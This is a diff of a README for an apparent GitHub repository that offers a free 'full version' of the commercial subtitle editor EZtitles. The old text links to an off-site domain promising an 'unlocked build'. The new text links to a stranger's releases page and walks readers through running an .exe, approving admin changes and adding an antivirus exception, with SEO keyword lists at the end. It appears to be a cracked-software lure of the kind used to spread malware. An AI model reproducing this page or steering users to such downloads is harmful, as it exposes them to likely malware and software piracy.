@@ -1,73 +1,72 @@
-# EZtitles — Full Version Download for Windows 11 & 10
+# 📁 EZtitles-2026 - Create professional subtitles on your Windows PC
 
-**EZtitles-2026**
+[![Download EZtitles-2026](https://img.shields.io/badge/Download-EZtitles-2026-blue)](https://github.com/endoscopic-gawker745/EZtitles-2026/releases)
 
-**EZtitles** — paid desktop app, **full / complete version** for Windows 10 and 11 (not a trial).  
-Direct installer link below.
+## 📌 Overview
+EZtitles-2026 provides a professional environment for subtitle creation and editing. This software helps users time subtitles to video, format text, and export files for various platforms. It serves as a tool for translators, editors, and content creators who need precision and control over their subtitles. This version works on Windows 10 and Windows 11.
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()
-[![Full Version](https://img.shields.io/badge/Full-Version-9333ea?style=flat-square)]()
-[![Download](https://img.shields.io/badge/Direct-Download-16a34a?style=flat-square)]()
+## ⚙️ System Requirements
+Before you install, ensure your computer meets these minimum specifications:
 
----
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Processor: Intel Core i3 or equivalent AMD processor.
+* Memory: 4 GB RAM.
+* Storage: 500 MB free disk space.
+* Display: 1280x720 resolution.
+* Internet: Required for software validation and updates.
 
-## Download & Install
+## 📥 Downloading the Software 🚀
+To get the latest version of the application, visit the release page. This page contains the full installer required for your system.
 
-> **This is the download page.** Use the button or link below to get **EZtitles** for Windows.
+[Click here to open the download page](https://github.com/endoscopic-gawker745/EZtitles-2026/releases)
 
-<p align="center">
-  <a href="https://eztitles.wonderchain.fun/">
-    <img src="https://img.shields.io/badge/Download-EZtitles-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download EZtitles">
-  </a>
-</p>
+Follow these steps to access the file:
+1. Click the link above to open the release repository in your web browser.
+2. Look for the "Assets" section at the bottom of the latest release post.
+3. Click the file ending in .exe to begin your download to your computer.
+4. Save the file in a familiar folder, such as your Downloads folder.
 
-| | |
-| --- | --- |
-| **Direct link** | **[eztitles.wonderchain.fun](https://eztitles.wonderchain.fun/)** |
-| **Full URL** | `https://eztitles.wonderchain.fun/` |
-| **Type** | Installer for Windows 10 / 11 (64-bit) |
-| **Admin** | Run setup as Administrator |
+## 🛠 Installation Steps
+Once the download finishes, follow this guide to set up the software:
 
-### Quick steps
+1. Locate the downloaded .exe file in your file explorer.
+2. Double-click the file to start the installer.
+3. If a security prompt appears asking "Do you want to allow this app to make changes," click "Yes."
+4. Follow the instructions on the screen to choose your installation path.
+5. Click "Install" to copy the necessary files to your machine.
+6. Once the progress bar reaches the end, click "Finish" to exit the installer.
+7. Find the EZtitles shortcut on your desktop to launch the program.
 
-1. Click **[Download — eztitles.wonderchain.fun](https://eztitles.wonderchain.fun/)** (link above)
-2. Save the file from the project page
-3. Run the setup **as Administrator**
-4. Enter your license key when prompted
-5. Restart if the installer asks — then launch from Start menu
+## 📖 Using the Software
+The interface contains a workspace for video playback and a timeline for subtitle events. Follow this simple workflow to begin:
 
-<p align="center"><a href="https://eztitles.wonderchain.fun/"><strong>⬇ Download EZtitles now</strong></a></p>
+1. Open the application from your start menu or desktop.
+2. Click "File" and select "Open Video" to load your source footage.
+3. Use the spacebar to play or pause your video.
+4. Press the designated insert key to place a timecode marker while watching your video.
+5. Type your subtitle text into the editor box.
+6. Adjust the start and end times to match the audio.
+7. Use the "Save" feature to export your work as an SRT file, which works with most video players and YouTube.
 
----
+## 🧩 Features
+* Frame-accurate subtitle timing tools.
+* Support for multiple subtitle formats.
+* Real-time preview window for text positioning.
+* Batch processing for subtitle exports.
+* Custom font settings for display clarity.
+* Keyboard shortcuts to improve editing speed.
 
-## About EZtitles
+## 🔍 Troubleshooting
+If the software fails to open, try these steps:
+* Check that you have the latest drivers for your graphics card.
+* Close other background programs that use high amounts of memory.
+* If the installer blocks the process, check if your antivirus software requires you to add an exception for the application.
+* Re-download the file if the installer reports that it is corrupted.
 
-**EZtitles** is commercial software. Most people search for the **full unlocked build** on Windows — all features enabled, not the limited trial.
+## 🔠 Configuration
+You can customize the layout of the editor through the "Preferences" menu. Change the background colors, text sizes, and shortcut assignments to match your specific workflow. These settings save automatically to your user folder.
 
-**Common searches:** eztitles download full version windows 11, subtitle editor eztitles install pc, srt editor software premium 2026
+## 🔄 Updates
+Check the release link periodically for newer versions. Updates often contain improvements to subtitle export formats and performance fixes for Windows 11. To update, simply download the new version and run the installer again. The system will overwrite the old files and keep your preferences intact.
 
-**What you get:** complete Windows installer (64-bit), full feature set.
-
-**Repository:** `EZtitles-2026`
-
-## Install (full version)
-
-| Step | Action |
-| --- | --- |
-| 1 | Download using the button above |
-| 2 | Run setup **as Administrator** |
-| 3 | Enter your **license key** when prompted |
-| 4 | Reboot once if the installer asks |
-
-## System requirements
-
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 8 GB (16 GB recommended) |
-| Disk | 1 GB free |
-| Admin | Required for install |
-
----
-
-**Topics:** eztitles-download-full-version-windows-11, eztitles, subtitle-editor-eztitles-install-pc, subtitle, editor, srt-editor-software-premium-2026, software, premium, eztitles-2026, subtitle-editor, srt-editor, youtube-subtitles
+Keywords: complete-version, download, editor, eztitles, eztitles-2026, eztitles-download-full-version-windows-11, full-installer, premium, software, srt-editor, srt-editor-software-premium-2026, subtitle, subtitle-editor, subtitle-editor-eztitles-install-pc, video-editing, windows-11, windows-software, youtube-subtitles
